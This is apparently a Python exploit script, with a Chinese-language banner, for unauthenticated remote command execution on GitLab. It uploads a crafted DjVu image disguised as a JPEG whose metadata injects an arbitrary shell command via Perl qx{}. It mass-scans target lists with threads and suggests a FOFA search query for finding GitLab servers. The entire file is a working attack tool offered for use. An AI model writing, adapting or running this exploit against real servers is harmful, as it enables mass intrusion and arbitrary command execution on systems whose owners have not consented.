from os import scandir
import re
import requests
import sys      
import argparse
import urllib3
import threading
urllib3.disable_warnings()


threads = []
thread_max = threading.BoundedSemaphore(10)

def scan(url, cmd):
    session=requests.session()
    first=url+"/users/sign_in"
    header={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded"
            }
    try:
        response=session.get(first,headers=header,verify=False,timeout=10)
        token=re.findall(r'name="csrf-token" content="(.+?)"',response.text)
        token=''.join(token)
        second=url
        second=second+"/uploads/user"
        data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{" + cmd + "} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
        headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36", "Connection": "close", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5", "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}
        response=session.post(second,headers=headers,data=data,verify=False,timeout=10)
        if 'Failed to process image' in response.text:
            print(url,"---- have vuln")
            infile = url + "\n"
            w = open(output, "a+")
            w.write(infile)
    except:
        pass
    if file != "":
        thread_max.release()

def banner():
    print('+---------------------------------------------------+')
    print('+ \033[1;36mGitLab 未授权远程命令执行漏洞 \033[0m                    +')
    print('+ \033[1;36mpython3 xxx.py -u/--url http://xxx.xxx.xxx.xxx -c cmd -f file -o outputFile\033[0m    +')
    print('+ \033[1;36mfofa 语句：title="GitLab"             \033[0m            +')
    print('+---------------------------------------------------+')

if len(sys.argv)==1:
    banner()
    sys.exit()
parser = argparse.ArgumentParser(description='Gitlab rce help')
parser.add_argument('-u','--url', help='Please Input a url!',default='')
parser.add_argument('-c','--cmd', help='Please Input a cmd!',default='ping www.baidu.com')
parser.add_argument('-f','--file', help='Please Input a file!',default='')
parser.add_argument('-o','--output', help='Please Input a file!',default='res.txt')
args=parser.parse_args()
url=args.url
file=args.file
cmd=args.cmd
output=args.output


if url!="" :
    url=url.strip("\n")
    scan(url, cmd)


if file!="":
    txt=file
    f=open(txt,'r+')
    for first in f.readlines():
        url=first.strip("\n")
        thread_max.acquire()
        t = threading.Thread(target=scan, args=(url,cmd,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
